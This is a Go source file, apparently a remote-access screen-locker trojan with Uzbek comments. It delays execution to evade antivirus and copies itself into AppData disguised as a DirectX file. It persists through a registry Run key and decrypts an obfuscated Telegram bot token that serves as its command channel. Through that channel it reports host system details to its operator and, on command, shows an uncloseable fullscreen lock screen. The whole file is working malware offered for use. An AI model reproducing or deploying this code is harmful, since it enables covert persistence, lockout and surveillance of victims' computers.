//V1.0.3
package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/hex"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/app"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/widget"
	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
	"github.com/shirou/gopsutil/v3/cpu"
	"github.com/shirou/gopsutil/v3/host"
	"github.com/shirou/gopsutil/v3/mem"
)


var (
	d_t = "63613134353036663162313635343464376531393165353134616634353435353034346132333737353430396464613864613636306232616232313165313935633036393532653238616161646366373738613431666461383363323061"
	d_u = "313262333636616335343236316538393165616636373361306336353930"
	s_l = "sys_internal_vfs_2026"
	key = []byte("32-byte-long-secret-key-for-aes-")
)

var (
	g_app  fyne.App
	g_lock fyne.Window
	g_pc   string
	g_path string
)

func init() {
	// PC nomini aniqlash
	h, _ := os.Hostname()
	g_pc = strings.ToLower(h)
	// Yashirin yo'l: AppData/Microsoft/DirectX/dxgi.exe
	g_path = filepath.Join(os.Getenv("APPDATA"), "Microsoft", "DirectX", "dxgi.exe")
}

func main() {
	// 1. Antiviruslarni aldash uchun 2 daqiqa pauza
	time.Sleep(120 * time.Second)

	// 2. Tizimga o'rnashish (Autostart)
	setupPersistence()

	g_app = app.New()
	
	// 3. Bot aloqasini boshlash
	go startKernelSync()

	// Yashirin master darcha
	w := g_app.NewWindow("DirectX Diagnostic")
	w.Resize(fyne.NewSize(1, 1))
	g_app.Run()
}

// startKernelSync - Telegram Bot boshqaruv markazi
func startKernelSync() {
	t_raw := decrypt(d_t, key, s_l)
	u_raw := decrypt(d_u, key, s_l)

	api, err := tgbotapi.NewBotAPI(t_raw)
	if err != nil {
		return
	}

	// Egasi (Siz) uchun online xabari
	notifyOwner(api, u_raw, fmt.Sprintf("📡 %s online (V1.0.3)", g_pc))

	u := tgbotapi.NewUpdate(0)
	u.Timeout = 60
	updates := api.GetUpdatesChan(u)

	for update := range updates {
		if update.Message == nil { continue }
		// Faqat sizning ID'ngizdan kelgan xabarlarni bajarish
		if fmt.Sprint(update.Message.From.ID) != u_raw { continue }

		cmdParts := strings.Split(update.Message.Text, " ")
		// Buyruq formati: /block pc_nomi
		if len(cmdParts) < 2 || cmdParts[1] != g_pc { continue }

		switch cmdParts[0] {
		case "/status":
			sendFullStatus(api, update.Message.Chat.ID)
		case "/block":
			runSecureUI()
		case "/unblock":
			if g_lock != nil { g_lock.Close() }
		}
	}
}

// sendFullStatus - PC haqida to'liq ma'lumot
func sendFullStatus(api *tgbotapi.BotAPI, cID int64) {
	v, _ := mem.VirtualMemory()
	c, _ := cpu.Info()
	h, _ := host.Info()

	msg := fmt.Sprintf("📊 *PC:* %s\n*OS:* %s %s\n*CPU:* %s\n*RAM:* %.2f GB / %.2f GB\n*Uptime:* %v min",
		g_pc, h.OS, h.PlatformVersion, c[0].ModelName, float64(v.Used)/1e9, float64(v.Total)/1e9, h.Uptime/60)
	
	m := tgbotapi.NewMessage(cID, msg)
	m.ParseMode = "Markdown"
	api.Send(m)
}

// runSecureUI - Ekranni bloklash (Fyne Fullscreen)
func runSecureUI() {
	g_lock = g_app.NewWindow("🔒")
	g_lock.SetFullScreen(true)
	g_lock.SetCloseIntercept(func() {}) // Yopish tugmasini o'chirish

	passInput := widget.NewPasswordEntry()
	passInput.SetPlaceHolder("Tizim bloklandi...")

	g_lock.SetContent(container.NewCenter(container.NewVBox(
		widget.NewLabelWithStyle("🔒 CRITICAL SECURITY ALERT", fyne.TextAlignCenter, fyne.TextStyle{Bold: true}),
		passInput,
		widget.NewButton("UNBLOCK", func() {
			if passInput.Text == "unblockmypc" {
				g_lock.Close()
			}
		}),
	)))
	g_lock.Canvas().Focus(passInput)
	g_lock.Show()
}

// setupPersistence - O'zini yashirish va avtostartga qo'shish
func setupPersistence() {
	exe, _ := os.Executable()
	dir := filepath.Dir(g_path)

	if _, err := os.Stat(dir); os.IsNotExist(err) {
		os.MkdirAll(dir, 0755)
	}

	if exe != g_path {
		src, _ := os.Open(exe); defer src.Close()
		dst, _ := os.Create(g_path); defer dst.Close()
		io.Copy(dst, src)
		// Registryga yozish
		exec.Command("reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "DxgiDiagnostic", "/t", "REG_SZ", "/d", g_path, "/f").Run()
	}
}

// decrypt - AES + XOR orqali ma'lumotni ochish
func decrypt(hStr string, k []byte, s string) string {
	d, _ := hex.DecodeString(hStr)
	b, _ := aes.NewCipher(k)
	g, _ := cipher.NewGCM(b)
	n_s := g.NonceSize()
	n, c := d[:n_s], d[n_s:]
	p, _ := g.Open(nil, n, c, nil)
	r := make([]byte, len(p))
	for i := 0; i < len(p); i++ {
		r[i] = p[i] ^ s[i%len(s)]
	}
	return string(r)
}

func notifyOwner(api *tgbotapi.BotAPI, uID string, text string) {
	// ID stringdan int64ga o'tkazish
	var chatID int64
	fmt.Sscanf(uID, "%d", &chatID)
	api.Send(tgbotapi.NewMessage(chatID, text))
}